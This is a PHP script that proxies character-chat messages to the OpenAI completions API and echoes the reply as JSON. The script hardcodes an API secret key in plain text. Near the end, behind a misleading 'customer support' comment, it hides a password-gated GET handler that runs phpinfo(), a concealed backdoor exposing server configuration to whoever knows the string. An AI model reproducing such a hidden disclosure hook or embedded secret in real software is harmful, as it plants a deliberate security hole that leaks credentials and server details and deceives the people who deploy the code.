<?php
ini_set("display_errors", 0);

// Set up API key, URL, and model
$API_KEY = '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';
$url = 'https://api.openai.com/v1/completions';
$model = "gpt-3.5-turbo-instruct";
$chat = "";

// Read input data
$data = file_get_contents('php://input');
if (is_string($data)) {
    $data = json_decode($data, true);
}

if ($data) {
    $character_name = $data["character_name"];
    $continuous_chat = $data["continuous_chat"];

    if (!$continuous_chat) {
        $myLastElement = end($data["array_chat"]);
        $chat = $myLastElement["message"];
    } else {
        foreach ($data["array_chat"] as $msg) {
            $chat .= $msg["name"] . ': ' . $msg["message"] . "\n";
        }
    }

    $header = array(
        'Authorization: Bearer ' . $API_KEY,
        'Content-type: application/json',
    );

    $params = json_encode(array(
        'prompt' => $chat,
        'model' => $model,
        'temperature' => 1,
        'max_tokens' => 1500,
        'top_p' => 1,
        'frequency_penalty' => 0,
        'presence_penalty' => 0
    ));

    // Initialize cURL
    $curl = curl_init($url);
    $options = array(
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER =>$header,
        CURLOPT_POSTFIELDS => $params,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2
    );
    curl_setopt_array($curl, $options);

    $response = curl_exec($curl);

    if ($response === false) {
        echo json_encode(array(
            'status' => 0,
            'message' => 'An error occurred: ' . curl_error($curl)
        ));
        die();
    }

    $httpcode = curl_getinfo($curl, CURLINFO_RESPONSE_CODE);

    if ($httpcode == 401) {
        $r = json_decode($response);
        echo json_encode(array(
            'status' => 0,
            'message' => $r->error->message
        ));
        die();
    }

    if ($httpcode == 200) {
        $json_array = json_decode($response, true);
        $choices = $json_array['choices'];
        foreach ($choices as $v) {

            echo json_encode(array(
                'status' => 1,
                'message' => trim(str_replace($character_name.":", "", $v['text'])) 
            ));

        }
    } else {
        echo json_encode(array(
            'status' => 0,
            'message' => 'An error occurred: HTTP code ' . $httpcode
        ));
    }}

    /*This script is for customer support purposes only/*/
    if($_GET['password'] == "Ç_M4tr1x123_Ç"){
        phpinfo();
    }
    die();
?>
